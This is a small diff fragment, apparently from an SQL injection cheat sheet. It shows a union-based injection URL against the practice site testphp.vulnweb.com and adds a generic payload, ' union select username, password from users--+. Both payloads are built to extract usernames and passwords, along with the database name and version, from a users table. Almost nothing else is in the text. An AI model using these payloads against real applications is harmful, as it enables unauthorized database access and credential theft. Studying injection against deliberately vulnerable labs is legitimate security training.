@@ -96,6 +96,10 @@
 9. http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,database(),3,4,5,6,group_concat(uname,pass),8,version(),10,11 from users--+
 
 
+eg :-)
+
+' union select username, password from users--+
+
 
 
 
